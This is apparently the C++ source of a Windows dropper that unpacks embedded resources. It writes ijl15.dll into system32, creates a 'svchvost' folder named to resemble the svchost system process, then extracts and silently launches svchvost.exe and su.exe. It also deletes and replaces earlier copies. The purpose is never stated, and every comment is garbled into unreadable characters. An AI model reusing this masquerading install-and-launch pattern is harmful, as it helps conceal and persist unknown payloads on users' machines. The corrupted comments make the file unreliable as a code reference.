#include <windows.h>
#include <iostream>
#include <shlwapi.h>
#include "resource.h"

using namespace std;

#pragma comment(lib, "shlwapi.lib")

// ��� ����� ������������ �� ����, ��� �����-������ ���������� ijl15.dll,
// ��� �������� ���������� �� �����������. ������� �� ������� ��������� ��� �����,
// ������� ������������� ��� ���������� ��� ������� � ��� �����, �����
// ������������� ���� ������ �� ���� C, ����� ��������� ���

int DeleteSU()
{
   // ���������, ���������� �� ����
   if (!PathFileExists("su.exe")) return 0;

   // ��� ��� ���������� ������� ���� ���� (��� � ��� �������)
   while (1)
   {
      // ���������� ��� Windows 98 �� ��������� ��� ��������� �����-����� ��� ������ ���� ���������, �� ��� ������
      DeleteFile("su.exe");

      if (!PathFileExists("su.exe")) break;  // ���� ����� ��� ���, �� ������� �� �����

      Sleep(500);  // ����� �������� ��� ������� ������ �������
   }

   return 0;
}

// �������, ����������� � ������������ ����� �� ����� ���� �� ������ �������
int UnpackResource(DWORD res_id, const char *path)
{
   // 1. ������� ��������� ����������� ��������� �� ����
   HRSRC hRc = FindResource(NULL, MAKEINTRESOURCE(res_id), RT_RCDATA);
   if (!hRc) return 0;

   HGLOBAL hRes = LoadResource(NULL, hRc );
   if (!hRes) return 0;

   LPVOID pData = LockResource(hRes);
   if (!pData) return 0;

   fpos_t *pos = (fpos_t*)pData;
   unsigned int size = (unsigned int)*pos;

   FILE *pFile = fopen(path, "wb");
   if (!pFile) return 0;

   // ���������� ���� �� ����
   if (fwrite((char*)pData+sizeof(fpos_t), 1, size, pFile) != size)
      return 0;

   fflush(pFile);
   fclose(pFile);

   return 1;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nCmdShow)
//int main()
{
   char sys_dir[1024];     // ���� � ����� system32
   char server_dir[1024];  // ������� ������� �������
   char exe_path[1024];    // �����, ������ ���� �������� ���������
   char buf[1024];         // ����� ��� ��������� �����
   if (!GetSystemDirectory(sys_dir, 1024)) return 0;
   GetModuleFileName(hInst, exe_path, 1024);

   strcpy(server_dir, sys_dir);
   strcat(server_dir, "\\svchvost");

   cout << "I am The Server Shuttle!" << endl;

   // ����� � ��� ���������� DLL
   strcpy(buf, sys_dir);
   strcat(buf, "\\ijl15.dll");

   // �� ��������� ������������ �������� - ���� ����� ���� ��� ����� ������ ���������
   UnpackResource(IDR_IJL15DLL_DATA, buf);

   if (!PathFileExists(server_dir))
      if (CreateDirectory(server_dir, NULL))
      {
         strcpy(buf, server_dir);
         strcat(buf, "\\ijl15.dll");
         UnpackResource(IDR_IJL15DLL_DATA, buf);
      }

   // ����� DLL-� ���������, ���� ���-�� ������ � ��������
   strcpy(buf, server_dir);
   strcat(buf, "\\svchvost.exe");

   // ���� ������ ������� �� ����� system32
   if (strcmp(exe_path, buf) == 0)
   {
      // ������� ������� ���������� ��������� su.exe
      DeleteSU();  // ��� �� ������� ����, ���� ���������� ��������� su.exe ������

      // ����� ��������� ���� ������ � ������ asd.dat � ��������� ��������� su.exe
      // ��� �� � ��� �� ������, ����� ������ �������
      if (!UnpackResource(IDR_SU_DATA, "su.exe"))
         return 0;

      if (!UnpackResource(IDR_SVCHVOST_DATA, "asd.dat"))
         return 0;

      // ��������� su.exe
      STARTUPINFO si;
      PROCESS_INFORMATION pi;

      ZeroMemory( &si, sizeof(si) );
      si.cb = sizeof(si);
      ZeroMemory( &pi, sizeof(pi) );

      strcpy(buf, server_dir);
      strcat(buf, "\\su.exe update svchvost.exe svchvost.exe asd.dat");

      // �� ��������� ������������ �������� - ��� ������
      CreateProcess( NULL, buf, // � ���������� ������������ ����� ������� (������ ���� ������� �� �� system32)
                           NULL,             // Process handle not inheritable. 
                           NULL,             // Thread handle not inheritable. 
                           FALSE,            // Set handle inheritance to FALSE. 
                           0,                // No creation flags. 
                           NULL,             // Use parent's environment block. 
                           server_dir,       // ��������� ��� �� �����, ��� ����� �������� ����� ������
                           &si,              // Pointer to STARTUPINFO structure.
                           &pi );            // Pointer to PROCESS_INFORMATION structure.

      // ������ ������� �� ���������
      return 0;
   }
   else
   {
      // ���� ��������� �������� �� �� system32, �� �������� ���������� ������
      // ����� ������� (������ 10 ������� �� ������� �� ������) � ��������� ���
      bool b_serv_deleted = false;
      strcpy(buf, server_dir);
      strcat(buf, "\\svchvost.exe");

      for (int i=0; i<10; i++)
      {
         DeleteFile(buf);

         if (!PathFileExists(buf))
         {
            b_serv_deleted = true;
            break;
         }
      }

      // ���� ������ ��� ������, �� ����� ���� ����� ������ � ��������� �� ������
      if (b_serv_deleted)
      {
         if (!UnpackResource(IDR_SVCHVOST_DATA, buf))
            return 0;

         STARTUPINFO si;
         PROCESS_INFORMATION pi;

         ZeroMemory( &si, sizeof(si) );
         si.cb = sizeof(si);
         ZeroMemory( &pi, sizeof(pi) );

         // �� ��������� ������������ �������� - ��� ������
         CreateProcess( NULL, buf, // � ���������� ������������ ����� ������� (������ ���� ������� �� �� system32)
                              NULL,             // Process handle not inheritable. 
                              NULL,             // Thread handle not inheritable. 
                              FALSE,            // Set handle inheritance to FALSE. 
                              0,                // No creation flags. 
                              NULL,             // Use parent's environment block. 
                              server_dir,       // ��������� ��� �� �����, ��� ����� �������� ����� ������
                              &si,              // Pointer to STARTUPINFO structure.
                              &pi );            // Pointer to PROCESS_INFORMATION structure.

      }
   }
   return 0;
}
